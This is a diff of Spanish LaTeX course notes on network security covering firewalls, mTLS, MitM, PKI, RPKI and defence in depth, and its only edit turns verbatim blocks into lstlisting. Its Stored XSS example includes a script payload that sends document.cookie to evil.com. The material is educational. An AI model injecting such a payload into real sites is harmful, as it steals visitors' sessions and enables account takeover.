@@ -70,7 +70,7 @@ WAF                   & HTTP/HTTPS            & Protege apps web (SQLi, XSS, OWA
 
 \subsection{Reglas de firewall --- Lógica básica}
 
-\begin{verbatim}
+\begin{lstlisting}
   Regla (stateless packet filter):
   ┌────────┬──────────┬──────────┬──────────┬──────────┬────────┐
   │ Source │ Src Port │   Dest   │ Dst Port │ Protocol │ Action │
@@ -81,7 +81,7 @@ WAF                   & HTTP/HTTPS            & Protege apps web (SQLi, XSS, OWA
   └────────┴──────────┴──────────┴──────────┴──────────┴────────┘
 
   Principio: todo lo que no esté explícitamente permitido, está DENEGADO.
-\end{verbatim}
+\end{lstlisting}
 
 \begin{cuidado}
 \textbf{SSL Inspection en NGFWs:} un NGFW puede descifrar TLS para inspeccionarlo
@@ -123,7 +123,7 @@ TLS normal: el cliente verifica la identidad del servidor (certificado).
 El servidor también exige un certificado válido del cliente.
 \end{concepto}
 
-\begin{verbatim}
+\begin{lstlisting}
   TLS normal:
     Cliente ──── verifica certificado ────► Servidor
     Cliente ◄──────────────────────────── Servidor (confiado)
@@ -137,7 +137,7 @@ El servidor también exige un certificado válido del cliente.
   El servicio A no habla con el servicio B a menos que tenga
   el certificado correcto --- elimina acceso no autorizado incluso
   dentro de la red interna.
-\end{verbatim}
+\end{lstlisting}
 
 \section{\eh{detective} Ataques de Red --- Catálogo}
 
@@ -155,11 +155,11 @@ El servidor también exige un certificado válido del cliente.
           \textbf{Man-in-the-Middle (MitM)}.
 \end{enumerate}
 
-\begin{verbatim}
+\begin{lstlisting}
   Normal:    Víctima ──────────────────► Gateway ──► Internet
   Atacado:   Víctima ──► Atacante MitM ──► Gateway ──► Internet
                          (ve y modifica todo)
-\end{verbatim}
+\end{lstlisting}
 
 \textbf{Defensa:}
 \begin{itemize}
@@ -381,13 +381,13 @@ cursor.execute("SELECT * FROM usuarios WHERE user=? AND pass=?",
 usuarios cargarán. El script se ejecuta en el browser de la víctima con
 sus cookies y sesión.
 
-\begin{verbatim}
+\begin{lstlisting}
   Stored XSS:
   1. Atacante publica comentario:
      <script>fetch('http://evil.com/?c='+document.cookie)</script>
   2. Otro usuario carga la página con ese comentario
   3. El script roba la cookie de sesión del usuario → account takeover
-\end{verbatim}
+\end{lstlisting}
 
 \textbf{Defensa:}
 \begin{itemize}
@@ -408,7 +408,7 @@ Certificadoras (CAs)} en las que los browsers confían implícitamente.
 Los browsers/OS vienen con $\sim$100--200 CAs raíz preinstaladas.
 \end{concepto}
 
-\begin{verbatim}
+\begin{lstlisting}
   Tipos de certificados:
 
   DV (Domain Validation):
@@ -423,7 +423,7 @@ Los browsers/OS vienen con $\sim$100--200 CAs raíz preinstaladas.
    └── Verificación exhaustiva de la empresa
        (el nombre de la empresa aparecía en la barra verde - hoy browsers
         eliminaron la barra verde porque los usuarios no la entendían)
-\end{verbatim}
+\end{lstlisting}
 
 \begin{cuidado}
 \textbf{Certificate Transparency (CT):} desde 2018, Chrome requiere que
@@ -446,7 +446,7 @@ Hijacking. Crea un sistema de firma criptográfica que prueba qué ASN tiene
 autorización de anunciar qué prefijos IP.
 \end{concepto}
 
-\begin{verbatim}
+\begin{lstlisting}
   Sin RPKI:
   AS64500 anuncia 8.8.8.0/24 (de Google)
   → Routers del mundo creen el anuncio
@@ -458,7 +458,7 @@ autorización de anunciar qué prefijos IP.
     que diga que AS15169 (Google) puede anunciar 8.8.8.0/24?
   → La respuesta es SÍ → el anuncio de AS64500 es INVÁLIDO
   → Router descarta el anuncio
-\end{verbatim}
+\end{lstlisting}
 
 \begin{moderno}
 \textbf{\emoji{rocket} Adopción de RPKI (2024):} Cloudflare, AT\&T, Telia, LACNIC
@@ -520,7 +520,7 @@ capa de seguridad. Si un control falla, los otros detienen al atacante.
 acceso al centro --- hay más capas por atravesar.
 \end{concepto}
 
-\begin{verbatim}
+\begin{lstlisting}
   Capas de defensa en una organización típica:
 
   Internet
@@ -545,7 +545,7 @@ acceso al centro --- hay más capas por atravesar.
      │
      ▼
   [Logging y SIEM: todo se registra, correlaciona y alerta]
-\end{verbatim}
+\end{lstlisting}
 
 Principios clave:
 \begin{itemize}
